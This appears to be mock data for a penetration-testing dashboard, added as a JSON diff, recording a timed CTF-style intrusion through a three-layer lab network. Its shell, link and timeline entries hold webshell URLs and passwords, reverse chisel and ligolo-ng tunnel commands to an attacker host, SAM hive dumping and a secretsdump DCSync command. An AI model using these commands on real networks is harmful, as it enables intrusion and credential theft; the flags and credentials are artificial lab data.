@@ -1,0 +1,822 @@
+{
+  "project": {
+    "id": "proj-1",
+    "name": "2026 春秋云镜 · 三层内网",
+    "startAt": "10:00",
+    "durationSec": 14400,
+    "note": "限时 4 小时 · 目标：三层内网全链路 + 域控"
+  },
+  "projects": [
+    {
+      "id": "proj-1",
+      "name": "2026 春秋云镜 · 三层内网"
+    },
+    {
+      "id": "proj-2",
+      "name": "HTB · Pivot Lab"
+    },
+    {
+      "id": "proj-3",
+      "name": "内部练习靶场 A"
+    }
+  ],
+  "hosts": [
+    {
+      "id": "h-attacker",
+      "ip": "192.0.2.10",
+      "hostname": "",
+      "os": "",
+      "layer": "LOCAL",
+      "segment": "192.0.2.0/24",
+      "privilege": "",
+      "owned": true,
+      "ports": [],
+      "services": [],
+      "note": "攻击端本机（启动时按真实机器识别）· 面板运行位置",
+      "isLocal": true,
+      "ifaces": [
+        {
+          "iface": "",
+          "ip": "192.0.2.10",
+          "segment": "192.0.2.0/24"
+        }
+      ]
+    },
+    {
+      "id": "h-l1-01",
+      "ip": "192.168.100.2",
+      "hostname": "web-dmz-01",
+      "os": "Ubuntu 20.04 (Apache/2.4.41)",
+      "layer": "L1",
+      "segment": "192.168.100.0/24",
+      "privilege": "www-data",
+      "owned": true,
+      "ports": [
+        80,
+        22
+      ],
+      "services": [
+        "http",
+        "ssh"
+      ],
+      "note": "入口机（双网卡）：对外 192.168.100.2，内网 10.85.101.3 → 可直通 L2",
+      "discovery": "入口点",
+      "ifaces": [
+        {
+          "iface": "eth0",
+          "ip": "192.168.100.2",
+          "segment": "192.168.100.0/24"
+        },
+        {
+          "iface": "eth1",
+          "ip": "10.85.101.3",
+          "segment": "10.85.101.0/24"
+        }
+      ]
+    },
+    {
+      "id": "h-l1-02",
+      "ip": "192.168.100.3",
+      "hostname": "web-dmz-02",
+      "os": "Ubuntu 20.04 (Nginx 1.18)",
+      "layer": "L1",
+      "segment": "192.168.100.0/24",
+      "privilege": "www-data",
+      "owned": true,
+      "ports": [
+        80
+      ],
+      "services": [
+        "http"
+      ],
+      "note": "经 L1-01 Socks 扫描发现，同源漏洞，已拿 Shell",
+      "discovery": "经代理扫描",
+      "ifaces": [
+        {
+          "iface": "eth0",
+          "ip": "192.168.100.3",
+          "segment": "192.168.100.0/24"
+        }
+      ]
+    },
+    {
+      "id": "h-l1-03",
+      "ip": "192.168.100.20",
+      "hostname": "db-dmz",
+      "os": "CentOS 7 (MySQL 5.7)",
+      "layer": "L1",
+      "segment": "192.168.100.0/24",
+      "privilege": "",
+      "owned": false,
+      "ports": [
+        3306,
+        22
+      ],
+      "services": [
+        "mysql",
+        "ssh"
+      ],
+      "note": "弱口令 root/root123 待验证，暂未拿 Shell",
+      "discovery": "经代理扫描",
+      "ifaces": [
+        {
+          "iface": "eth0",
+          "ip": "192.168.100.20",
+          "segment": "192.168.100.0/24"
+        }
+      ]
+    },
+    {
+      "id": "h-l2-01",
+      "ip": "10.85.101.4",
+      "hostname": "app-int-01",
+      "os": "CentOS 7.9 (Tomcat 9)",
+      "layer": "L2",
+      "segment": "10.85.101.0/24",
+      "privilege": "tomcat",
+      "owned": true,
+      "ports": [
+        8080,
+        22
+      ],
+      "services": [
+        "http-alt",
+        "ssh"
+      ],
+      "note": "Tomcat 后台弱口令部署 war 拿 Shell；双网卡（10.85.101.4 / 172.56.102.4）→ 可直通 L3",
+      "discovery": "经 L1 代理扫描",
+      "ifaces": [
+        {
+          "iface": "eth0",
+          "ip": "10.85.101.4",
+          "segment": "10.85.101.0/24"
+        },
+        {
+          "iface": "eth1",
+          "ip": "172.56.102.4",
+          "segment": "172.56.102.0/24"
+        }
+      ]
+    },
+    {
+      "id": "h-l2-02",
+      "ip": "10.85.101.2",
+      "hostname": "app-int-02",
+      "os": "Windows Server 2019 (IIS 10)",
+      "layer": "L2",
+      "segment": "10.85.101.0/24",
+      "privilege": "iis apppool",
+      "owned": true,
+      "ports": [
+        80,
+        445,
+        3389
+      ],
+      "services": [
+        "http",
+        "smb",
+        "rdp"
+      ],
+      "note": "ASPX 马已落地 /upload/shell.aspx，主机名显示已加域",
+      "discovery": "经 L1 代理扫描",
+      "ifaces": [
+        {
+          "iface": "eth0",
+          "ip": "10.85.101.2",
+          "segment": "10.85.101.0/24"
+        }
+      ]
+    },
+    {
+      "id": "h-l2-03",
+      "ip": "10.85.101.30",
+      "hostname": "file-int",
+      "os": "Windows Server 2016",
+      "layer": "L2",
+      "segment": "10.85.101.0/24",
+      "privilege": "",
+      "owned": false,
+      "ports": [
+        445,
+        3389
+      ],
+      "services": [
+        "smb",
+        "rdp"
+      ],
+      "note": "SMB 匿名可读共享 \\file-int\backup，疑似含备份脚本与凭据",
+      "discovery": "经 L1 代理扫描",
+      "ifaces": [
+        {
+          "iface": "eth0",
+          "ip": "10.85.101.30",
+          "segment": "10.85.101.0/24"
+        }
+      ]
+    },
+    {
+      "id": "h-l3-01",
+      "ip": "172.56.102.8",
+      "hostname": "DC01",
+      "os": "Windows Server 2019 (AD DS)",
+      "layer": "L3",
+      "segment": "172.56.102.0/24",
+      "privilege": "",
+      "owned": false,
+      "ports": [
+        53,
+        88,
+        389,
+        445
+      ],
+      "services": [
+        "dns",
+        "kerberos",
+        "ldap",
+        "smb"
+      ],
+      "note": "域控 · 域 supercorp.local，已获取域管哈希待横向",
+      "discovery": "经 L2 代理扫描",
+      "ifaces": [
+        {
+          "iface": "eth0",
+          "ip": "172.56.102.8",
+          "segment": "172.56.102.0/24"
+        }
+      ]
+    },
+    {
+      "id": "h-l3-02",
+      "ip": "172.56.102.12",
+      "hostname": "SRV-SQL",
+      "os": "Windows Server 2019 (MSSQL 2019)",
+      "layer": "L3",
+      "segment": "172.56.102.0/24",
+      "privilege": "",
+      "owned": false,
+      "ports": [
+        1433,
+        445
+      ],
+      "services": [
+        "mssql",
+        "smb"
+      ],
+      "note": "疑似域内数据库，凭据复用候选目标",
+      "discovery": "经 L2 代理扫描",
+      "ifaces": [
+        {
+          "iface": "eth0",
+          "ip": "172.56.102.12",
+          "segment": "172.56.102.0/24"
+        }
+      ]
+    },
+    {
+      "id": "h-l3-03",
+      "ip": "172.56.102.25",
+      "hostname": "srv-ops",
+      "os": "Windows Server 2016",
+      "layer": "L3",
+      "segment": "172.56.102.0/24",
+      "privilege": "",
+      "owned": false,
+      "ports": [
+        5985,
+        445
+      ],
+      "services": [
+        "winrm",
+        "smb"
+      ],
+      "note": "运维跳板机，WinRM 开放",
+      "discovery": "经 L2 代理扫描",
+      "ifaces": [
+        {
+          "iface": "eth0",
+          "ip": "172.56.102.25",
+          "segment": "172.56.102.0/24"
+        }
+      ]
+    }
+  ],
+  "shells": [
+    {
+      "id": "s-1",
+      "hostId": "h-l1-01",
+      "type": "PHP 一句话马",
+      "url": "http://192.168.100.2/upload/shell.php",
+      "pass": "rebeyond",
+      "encoder": "base64",
+      "alive": true,
+      "latency": 24,
+      "lastBeat": "3 秒前",
+      "hostname": "web-dmz-01",
+      "privilege": "www-data",
+      "stable": true
+    },
+    {
+      "id": "s-2",
+      "hostId": "h-l1-02",
+      "type": "PHP 自定义马",
+      "url": "http://192.168.100.3/images/logo.php",
+      "pass": "A1b2C3d4E5f6G7h8",
+      "encoder": "AES-128",
+      "alive": true,
+      "latency": 38,
+      "lastBeat": "6 秒前",
+      "hostname": "web-dmz-02",
+      "privilege": "www-data"
+    },
+    {
+      "id": "s-3",
+      "hostId": "h-l2-01",
+      "type": "JSP 一句话马",
+      "url": "http://10.85.101.4:8080/app/cmd.jsp",
+      "pass": "p@ssw0rd",
+      "encoder": "none",
+      "alive": true,
+      "latency": 112,
+      "lastBeat": "11 秒前",
+      "hostname": "app-int-01",
+      "privilege": "tomcat"
+    },
+    {
+      "id": "s-4",
+      "hostId": "h-l2-02",
+      "type": "ASPX 一句话马",
+      "url": "http://10.85.101.2/upload/shell.aspx",
+      "pass": "Zx9!kL",
+      "encoder": "base64",
+      "alive": true,
+      "latency": 168,
+      "lastBeat": "8 秒前",
+      "hostname": "APP-INT-02",
+      "privilege": "iis apppool"
+    },
+    {
+      "id": "s-5",
+      "hostId": "h-l1-03",
+      "type": "PHP 一句话马",
+      "url": "http://192.168.100.20/db.php",
+      "pass": "test",
+      "encoder": "base64",
+      "alive": false,
+      "latency": 0,
+      "lastBeat": "4 分钟前（断线）",
+      "hostname": "",
+      "privilege": ""
+    }
+  ],
+  "links": [
+    {
+      "id": "p-1",
+      "tool": "chisel",
+      "linkType": "socks",
+      "direction": "反向",
+      "fromHostId": "h-l1-01",
+      "toHostId": "h-attacker",
+      "listenPort": 1331,
+      "remoteBind": "0.0.0.0",
+      "localPort": 10006,
+      "localSocks": "192.0.2.10:10006",
+      "targetSegment": "10.85.101.0/24",
+      "status": "alive",
+      "latency": 24,
+      "traffic": "18.4 MB",
+      "conf": "chisel client 192.0.2.10:1331 R:0.0.0.0:10006:socks",
+      "createdBy": "半自动档",
+      "hops": [
+        {
+          "role": "攻击机监听",
+          "hostId": "h-attacker",
+          "cmd": "./chisel server -p 1331 --reverse"
+        },
+        {
+          "role": "入口机回连",
+          "hostId": "h-l1-01",
+          "cmd": "./chisel client 192.0.2.10:1331 R:0.0.0.0:10006:socks"
+        }
+      ]
+    },
+    {
+      "id": "p-2",
+      "tool": "chisel",
+      "linkType": "portfwd",
+      "direction": "反向",
+      "fromHostId": "h-l1-02",
+      "toHostId": "h-attacker",
+      "listenPort": 1331,
+      "remoteBind": "0.0.0.0",
+      "localPort": 10001,
+      "targetHost": "10.85.101.3",
+      "targetPort": 80,
+      "localSocks": "192.0.2.10:10001",
+      "targetSegment": "10.85.101.0/24",
+      "status": "alive",
+      "latency": 41,
+      "traffic": "3.1 MB",
+      "conf": "chisel client 192.0.2.10:1331 R:0.0.0.0:10001:10.85.101.3:80",
+      "createdBy": "半自动档",
+      "hops": [
+        {
+          "role": "攻击机监听",
+          "hostId": "h-attacker",
+          "cmd": "./chisel server -p 1331 --reverse"
+        },
+        {
+          "role": "入口机回连（单端口转发）",
+          "hostId": "h-l1-02",
+          "cmd": "./chisel client 192.0.2.10:1331 R:0.0.0.0:10001:10.85.101.3:80"
+        }
+      ]
+    },
+    {
+      "id": "p-3",
+      "tool": "chisel",
+      "linkType": "relay",
+      "direction": "反向",
+      "fromHostId": "h-l2-01",
+      "toHostId": "h-l1-01",
+      "listenPort": 1331,
+      "remoteBind": "0.0.0.0",
+      "localPort": 10005,
+      "relayAddr": "10.85.101.3",
+      "relayPort": 1331,
+      "localSocks": "192.0.2.10:10005",
+      "targetSegment": "172.56.102.0/24",
+      "status": "alive",
+      "latency": 118,
+      "traffic": "42.7 MB",
+      "conf": "chisel client 10.85.101.3:1331 R:0.0.0.0:10005:socks",
+      "createdBy": "半自动档",
+      "hops": [
+        {
+          "role": "攻击机监听",
+          "hostId": "h-attacker",
+          "cmd": "./chisel server -p 1331 --reverse"
+        },
+        {
+          "role": "L1 入口机中继（把 1331 转发到内网口）",
+          "hostId": "h-l1-01",
+          "cmd": "./chisel client 192.0.2.10:1331 1331:1331"
+        },
+        {
+          "role": "L2 双网卡机回连（穿透到 L3）",
+          "hostId": "h-l2-01",
+          "cmd": "./chisel client 10.85.101.3:1331 R:0.0.0.0:10005:socks"
+        }
+      ]
+    },
+    {
+      "id": "p-4",
+      "tool": "Stowaway",
+      "linkType": "socks",
+      "direction": "反向",
+      "fromHostId": "h-l2-02",
+      "toHostId": "h-l1-01",
+      "listenPort": 1331,
+      "remoteBind": "0.0.0.0",
+      "localPort": 10004,
+      "relayAddr": "10.85.101.3",
+      "relayPort": 1331,
+      "localSocks": "192.0.2.10:10004",
+      "targetSegment": "10.85.101.0/24",
+      "status": "alive",
+      "latency": 165,
+      "traffic": "9.8 MB",
+      "conf": "stowaway_admin -l 1331",
+      "createdBy": "自动档",
+      "hops": [
+        {
+          "role": "攻击机监听",
+          "hostId": "h-attacker",
+          "cmd": "./chisel server -p 1331 --reverse"
+        },
+        {
+          "role": "L1 中继",
+          "hostId": "h-l1-01",
+          "cmd": "./chisel client 192.0.2.10:1331 1331:1331"
+        },
+        {
+          "role": "L2 节点回连",
+          "hostId": "h-l2-02",
+          "cmd": "./stowaway_agent 10.85.101.3:1331"
+        }
+      ]
+    },
+    {
+      "id": "p-5",
+      "tool": "ligolo-ng",
+      "linkType": "socks",
+      "direction": "反向",
+      "fromHostId": "h-l2-01",
+      "toHostId": "h-l1-01",
+      "listenPort": 11601,
+      "remoteBind": "0.0.0.0",
+      "localPort": 10003,
+      "relayAddr": "10.85.101.3",
+      "relayPort": 11601,
+      "localSocks": "192.0.2.10:10003",
+      "targetSegment": "172.56.102.0/24",
+      "status": "error",
+      "latency": 0,
+      "traffic": "0 B",
+      "conf": "agent -connect 10.85.101.3:11601",
+      "createdBy": "半自动档",
+      "note": "上次部署后 30s 内未回连，已自动标记失败并降级回半自动档",
+      "hops": [
+        {
+          "role": "攻击机监听",
+          "hostId": "h-attacker",
+          "cmd": "./proxy -selfcert -laddr 0.0.0.0:11601"
+        },
+        {
+          "role": "L1 中继",
+          "hostId": "h-l1-01",
+          "cmd": "./chisel client 192.0.2.10:1331 11601:11601"
+        },
+        {
+          "role": "L2 节点回连",
+          "hostId": "h-l2-01",
+          "cmd": "./agent -connect 10.85.101.3:11601 -ignore-cert"
+        }
+      ]
+    }
+  ],
+  "creds": [
+    {
+      "id": "c-1",
+      "hostId": "h-l1-01",
+      "username": "www-data",
+      "secret": "www-data",
+      "kind": "密码",
+      "services": [
+        "ssh"
+      ],
+      "reuse": true,
+      "source": "config.php 明文",
+      "time": "10:24"
+    },
+    {
+      "id": "c-2",
+      "hostId": "h-l1-03",
+      "username": "root",
+      "secret": "root123",
+      "kind": "密码",
+      "services": [
+        "mysql",
+        "ssh"
+      ],
+      "reuse": true,
+      "source": "弱口令爆破",
+      "time": "10:41"
+    },
+    {
+      "id": "c-3",
+      "hostId": "h-l2-01",
+      "username": "tomcat",
+      "secret": "tomcat:s3cret",
+      "kind": "密码",
+      "services": [
+        "tomcat"
+      ],
+      "reuse": true,
+      "source": "Tomcat manager 弱口令",
+      "time": "11:07"
+    },
+    {
+      "id": "c-4",
+      "hostId": "h-l2-02",
+      "username": "SUPERCORP\\svc_web",
+      "secret": "P@ssw0rd2026!",
+      "kind": "密码",
+      "services": [
+        "smb",
+        "rdp"
+      ],
+      "reuse": true,
+      "source": "web.config 明文",
+      "time": "11:38"
+    },
+    {
+      "id": "c-5",
+      "hostId": "h-l2-02",
+      "username": "SUPERCORP\\administrator",
+      "secret": "aad3b435b51404eeaad3b435b51404ee:8f3c1c2f9c1a...",
+      "kind": "NTLM 哈希",
+      "services": [
+        "smb"
+      ],
+      "reuse": true,
+      "source": "SAM dump",
+      "time": "12:02"
+    },
+    {
+      "id": "c-6",
+      "hostId": "h-l2-01",
+      "username": "root",
+      "secret": "toor#2026",
+      "kind": "密码",
+      "services": [
+        "ssh"
+      ],
+      "reuse": false,
+      "source": "history 文件",
+      "time": "12:15"
+    },
+    {
+      "id": "c-7",
+      "hostId": "h-l2-03",
+      "username": "backup",
+      "secret": "Backup@2026",
+      "kind": "密码",
+      "services": [
+        "smb"
+      ],
+      "reuse": true,
+      "source": "匿名共享 backup.bat",
+      "time": "12:31"
+    }
+  ],
+  "flags": [
+    {
+      "id": "f-1",
+      "hostId": "h-l1-01",
+      "stage": "L1 入口",
+      "value": "flag{dmz_upload_pwn3d_7a91}",
+      "submitted": true,
+      "time": "10:31"
+    },
+    {
+      "id": "f-2",
+      "hostId": "h-l1-02",
+      "stage": "L1 入口",
+      "value": "flag{nginx_lfi_ch4in_2c07}",
+      "submitted": true,
+      "time": "10:52"
+    },
+    {
+      "id": "f-3",
+      "hostId": "h-l2-01",
+      "stage": "L2 内网",
+      "value": "flag{tomcat_war_deploy_88f1}",
+      "submitted": true,
+      "time": "11:26"
+    },
+    {
+      "id": "f-4",
+      "hostId": "h-l2-02",
+      "stage": "L2 内网",
+      "value": "flag{iis_aspx_shell_9e4d}",
+      "submitted": false,
+      "time": "12:08"
+    },
+    {
+      "id": "f-5",
+      "hostId": "h-l3-01",
+      "stage": "L3 域",
+      "value": "flag{dc_sync_dcsync_b7aa}",
+      "submitted": false,
+      "time": "12:47"
+    }
+  ],
+  "timeline": [
+    {
+      "id": "t-1",
+      "time": "10:12",
+      "kind": "host",
+      "title": "登记入口资产 web-dmz-01",
+      "hostId": "h-l1-01",
+      "detail": "从 Writeup 提示得知 upload.php 存在任意文件上传"
+    },
+    {
+      "id": "t-2",
+      "time": "10:18",
+      "kind": "shell",
+      "title": "拿到 L1 入口 Shell（PHP 一句话马）",
+      "hostId": "h-l1-01",
+      "cmd": "POST /upload/shell.php  pass=rebeyond&cmd=id",
+      "detail": "回显 uid=33(www-data)"
+    },
+    {
+      "id": "t-3",
+      "time": "10:21",
+      "kind": "host",
+      "title": "自动回传基础信息并入库",
+      "hostId": "h-l1-01",
+      "detail": "whoami=www-data / uname=Linux web-dmz-01 5.4.0-42 / eth0=192.168.100.2"
+    },
+    {
+      "id": "t-4",
+      "time": "10:24",
+      "kind": "cred",
+      "title": "收集凭据 www-data（config.php 明文）",
+      "hostId": "h-l1-01"
+    },
+    {
+      "id": "t-5",
+      "time": "10:26",
+      "kind": "proxy",
+      "title": "出网探测完成：可反向 TCP 出网",
+      "hostId": "h-l1-01",
+      "detail": "ICMP 阻断 / DNS 可达 / HTTP 可达 / TCP 8443 可达 → 推荐 chisel（单文件），备选 frp"
+    },
+    {
+      "id": "t-6",
+      "time": "10:29",
+      "kind": "proxy",
+      "title": "chisel 反向 Socks 回连成功，登记 ProxyLink",
+      "hostId": "h-l1-01",
+      "cmd": "./chisel client 192.0.2.10:1331 R:0.0.0.0:10006:socks",
+      "detail": "统一入口 192.0.2.10:10006 → 10.85.101.0/24"
+    },
+    {
+      "id": "t-7",
+      "time": "10:31",
+      "kind": "flag",
+      "title": "拿到 Flag：L1 入口",
+      "hostId": "h-l1-01",
+      "detail": "flag{dmz_upload_pwn3d_7a91}（已提交）"
+    },
+    {
+      "id": "t-8",
+      "time": "10:38",
+      "kind": "host",
+      "title": "经代理扫描发现 10.85.101.0/24 共 3 台主机",
+      "detail": "proxychains4 nmap -sT -Pn -p- 10.85.101.0/24"
+    },
+    {
+      "id": "t-9",
+      "time": "10:47",
+      "kind": "shell",
+      "title": "拿到 web-dmz-02 Shell（自定义 AES 马）",
+      "hostId": "h-l1-02"
+    },
+    {
+      "id": "t-10",
+      "time": "11:02",
+      "kind": "proxy",
+      "title": "单端口转发：暴露 10.85.101.3:80",
+      "hostId": "h-l1-02",
+      "cmd": "./chisel client 192.0.2.10:1331 R:0.0.0.0:10001:10.85.101.3:80",
+      "detail": "访问 http://192.0.2.10:10001 即可打开 L2 的 Web 服务"
+    },
+    {
+      "id": "t-11",
+      "time": "11:19",
+      "kind": "note",
+      "title": "L2 突破思路记录",
+      "hostId": "h-l2-01",
+      "markdown": "L2 的 Tomcat 后台是 **tomcat:tomcat** 弱口令，直接部署 war 包即可。\n注意 `10.85.101.0/24` 段内还有一台 `app-int-02`（IIS），主机名带域后缀，怀疑存在域环境。\n\n另外 `10.85.101.4` 是双网卡（`172.56.102.4`），可作为进入 L3 的中继节点。"
+    },
+    {
+      "id": "t-12",
+      "time": "11:26",
+      "kind": "flag",
+      "title": "拿到 Flag：L2 内网",
+      "hostId": "h-l2-01"
+    },
+    {
+      "id": "t-13",
+      "time": "11:44",
+      "kind": "proxy",
+      "title": "多级中继：经 L1 内网口穿透到 L3",
+      "hostId": "h-l2-01",
+      "cmd": "./chisel client 10.85.101.3:1331 R:0.0.0.0:10005:socks",
+      "detail": "L2 无法直连攻击机 → 先由 L1 把 1331 转发到内网口 10.85.101.3 → 本层回连成功 → 192.0.2.10:10005"
+    },
+    {
+      "id": "t-14",
+      "time": "12:02",
+      "kind": "cred",
+      "title": "SAM dump 获取域管 NTLM 哈希",
+      "hostId": "h-l2-02",
+      "cmd": "reg save HKLM\\SAM sam.hiv && reg save HKLM\\SYSTEM system.hiv"
+    },
+    {
+      "id": "t-15",
+      "time": "12:31",
+      "kind": "cred",
+      "title": "匿名共享发现 backup 账号",
+      "hostId": "h-l2-03",
+      "detail": "\\\\file-int\\backup\\backup.bat 内硬编码账号 backup:Backup@2026"
+    },
+    {
+      "id": "t-16",
+      "time": "12:47",
+      "kind": "flag",
+      "title": "拿到 Flag：L3 域（DCSync）",
+      "hostId": "h-l3-01",
+      "cmd": "secretsdump.py supercorp.local/svc_web:P@ssw0rd2026!@172.56.102.8 -just-dc-user administrator"
+    },
+    {
+      "id": "t-17",
+      "time": "12:50",
+      "kind": "proxy",
+      "title": "ligolo-ng 自动档部署失败，已降级半自动",
+      "hostId": "h-l2-01",
+      "detail": "agent 未在 30s 内回连（疑似 AV 拦截），已给出失败原因并回退到半自动档"
+    }
+  ]
+}
